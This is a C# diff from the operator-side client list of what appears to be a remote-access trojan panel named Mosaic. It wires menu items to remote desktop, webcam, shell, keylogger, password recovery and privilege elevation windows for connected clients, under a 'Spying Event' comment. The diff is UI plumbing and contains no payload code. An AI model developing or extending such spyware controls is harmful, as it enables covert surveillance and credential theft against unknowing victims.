@@ -4,19 +4,9 @@ using Serveur.Models;
 using Serveur.Views;
 using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
 
 namespace MosaicServeur.Main
 {
@@ -29,76 +19,136 @@ namespace MosaicServeur.Main
         private readonly Queue<KeyValuePair<ClientMosaic, bool>> _clientConnections = new Queue<KeyValuePair<ClientMosaic, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
-        public static ClientsListView instance;
-        private FrmMainController _frmMainController;
-        private FrmListenerController _frmListenerController;
-        private int selectedRow;
         private readonly object _clientsLock = new object();
+        static int clientsCount;
 
         public ClientsListView()
-        {
-            instance = this;
-            _frmMainController = new FrmMainController();
-            // >> LISTENER >>
-            _frmListenerController = new FrmListenerController();
-            ListenerState.startListen = false;
-            if (ListenerState.autoListen == true)
-            {
-                ListenerState.startListen = true;
-                _frmListenerController.listen(ListenerState.listenPort, ListenerState.IPv6Support);
-            }
+        {           
             InitializeComponent();
             ClientMosaic.DvgUpdater += dgvUpdater;
-
-            //var MyItem = new MyItem { Ip= "salut", Name="çava", AccType = "bien", Country="oupas?",  Os="vraiment", Status="bien"};
-            //lvClients.Items.Add(new MyItem { Ip = "salut", Name = "çava", AccType = "bien", Country = "oupas?", Os = "vraiment", Status = "bien" });
-        }
-
-        private void testFrm(object sender, RoutedEventArgs e)
-        {
-            FrmRemoteDesktop frmRd = new FrmRemoteDesktop();
-            frmRd.ShowDialog();
+            clientsCount = 0;
         }
 
         // System Event
-         
-
         private void SysInfoMenuItem(object sender, RoutedEventArgs e)
         {
-
+            if (getClient() != null)
+            {
+                FrmSystemInformation frmSi = new FrmSystemInformation(getClient());
+                frmSi.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmSi.Show();
+                frmSi.Focus();
+            }
         }
 
         private void FileMgMenuItem(object sender, RoutedEventArgs e)
         {
-
+            if (getClient() != null)
+            {
+                FrmFileManager frmFm = new FrmFileManager(getClient());
+                frmFm.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmFm.Show();
+                frmFm.Focus();
+            }
         }
 
         private void TaskMgMenuItem(object sender, RoutedEventArgs e)
         {
-
+            if (getClient() != null)
+            {
+                FrmTaskManager frmTm = new FrmTaskManager(getClient());
+                frmTm.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmTm.Show();
+                frmTm.Focus();
+            }
         }
 
         private void StartupMgMenuItem(object sender, RoutedEventArgs e)
         {
-
+            if (getClient() != null)
+            {
+                FrmStartupManager frmSm = new FrmStartupManager(getClient());
+                frmSm.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmSm.Show();
+                frmSm.Focus();
+            }
         }
 
         private void RunasMenuItem(object sender, RoutedEventArgs e)
         {
-
+            new Serveur.Packets.ServerPackets.DoAskElevate().Execute(getClient());
         }
 
         // Spying Event
+        private void RdMenuItem(object sender, RoutedEventArgs e) // REMOTE DESKTOP
+        {
+            if (getClient() != null)
+            {
+                FrmRemoteDesktop frmRd = new FrmRemoteDesktop(getClient());
+                frmRd.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmRd.Show();
+                frmRd.Focus();
+            }
+        }
 
+        private void RwMenuItem(object sender, RoutedEventArgs e) // REMOTE WEBCAM
+        {
+            if (getClient() != null)
+            {
+                FrmRemoteWebcam frmRw = new FrmRemoteWebcam(getClient());
+                frmRw.Text = SetWindowTitle("Remote Webcam", getClient());
+                frmRw.Show();
+                frmRw.Focus();
+            }
+        }
 
+        private void RsMenuItem(object sender, RoutedEventArgs e) // REMOTE SHELL
+        {
+            if (getClient() != null)
+            {
+                FrmRemoteShell frmRs = new FrmRemoteShell(getClient());
+                frmRs.Text = SetWindowTitle("Remote Shell", getClient());
+                frmRs.Show();
+                frmRs.Focus();
+            }
+        }
 
+        private void PrMenuItem(object sender, RoutedEventArgs e) // PASSWORD RECOVERY
+        {
+            if (getClient() != null)
+            {
+                FrmPasswordRecovery frmPr = new FrmPasswordRecovery(getClient());
+                frmPr.Text = SetWindowTitle("Remote Shell", getClient());
+                frmPr.Show();
+                frmPr.Focus();
+            }
+        }
 
+        private void KlMenuItem(object sender, RoutedEventArgs e) // KEY LOGGER
+        {
+            if (getClient() != null)
+            {
+                FrmKeyLogger frmKl = new FrmKeyLogger(getClient());
+                frmKl.Text = SetWindowTitle("Remote Shell", getClient());
+                frmKl.Show();
+                frmKl.Focus();
+            }
+        }
 
+        /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
+        public ClientMosaic getClient()
+        {
+            try
+            {
+                return ((ClientRegistration)lvClients.SelectedItem).Client;
+            }
+            catch
+            {
+                return null;
+            }
+        }
 
-
-
-
-
+        #region UpdateClientsOfListView
         // :: GET - ADD - REMOVE FROM DATAGRIDVIEW :: //
         public void dgvUpdater(ClientMosaic client, bool addOrRem)
         {
@@ -186,9 +236,11 @@ namespace MosaicServeur.Main
                     {
                         case true:
                             addClientToListView(client.Key);
+                            clientsCount++;
                             break;
                         case false:
                             removeClientFromListView(client.Key);
+                            clientsCount--;
                             break;
                     }
                 }
@@ -201,20 +253,12 @@ namespace MosaicServeur.Main
 
             try
             {
-                //ListViewItem lvi = new ListViewItem(new string[]
-                //{
-                //    client.endPoint.ToString().Split(':')[0], client.value.name,
-                //    client.value.accountType, client.value.country, client.value.operatingSystem, "Connected"
-                //})
-                //{ Tag = client };
-
-
                 lvClients.Dispatcher.BeginInvoke(new Action(delegate
                 {
                     lock (_lockClients)
                     {
-                        lvClients.Items.Add(new MyItem { Ip = client.endPoint.ToString().Split(':')[0], Name = client.value.name, AccType = client.value.accountType,
-                            Country = client.value.country, Os = client.value.operatingSystem, Status = "Connected" });
+                        lvClients.Items.Add(new ClientRegistration { Ip = client.endPoint.ToString().Split(':')[0], Name = client.value.name, AccType = client.value.accountType,
+                            Country = client.value.country, Os = client.value.operatingSystem, Status = "Connected", Client = client });
                     }
                 }));
             }
@@ -233,11 +277,12 @@ namespace MosaicServeur.Main
                 {
                     lock (_lockClients)
                     {
-                        foreach (ListViewItem lvi in lvClients.Items.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
+                       for(int i = 0; i < lvClients.Items.Count; i++)
                         {
-                           // lvi.Remove();
-                            break;
+                            if(client == ((ClientRegistration)lvClients.Items[i]).Client)
+                            {
+                                lvClients.Items.RemoveAt(i);
+                            }
                         }
                     }
                 }));
@@ -245,36 +290,18 @@ namespace MosaicServeur.Main
             catch (InvalidOperationException)
             {
             }
+        }
+        #endregion
 
-
-            //statusBarListening.Dispatcher.BeginInvoke(new Action(delegate
-            //{
-            //    //lblListening.Text = status;
-            //}));
-
+        //TOOLS 
+        public string SetWindowTitle(string title, ClientMosaic c)
+        {
+            return string.Format("{0} - {1} - [{2}:{3}]", title, c.value.name, c.endPoint.Address.ToString(), c.endPoint.Port.ToString());
         }
 
-        /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
-        //public ClientMosaic getClient()
-        //{
-        //    //return (ClientMosaic)lvClients.SelectedItems[0].Tag;
-        //}
-
-    }
-
-    public class MyItem
-    {
-        public string Ip { get; set; }
-
-        public string Name { get; set; }
-
-        public string AccType { get; set; }
-
-        public string Country { get; set; }
-
-        public string Os { get; set; }
-
-        public string Status { get; set; }
-
-    }
+        public static int connectedClients()
+        {
+            return clientsCount;
+        }
+    }    
 }
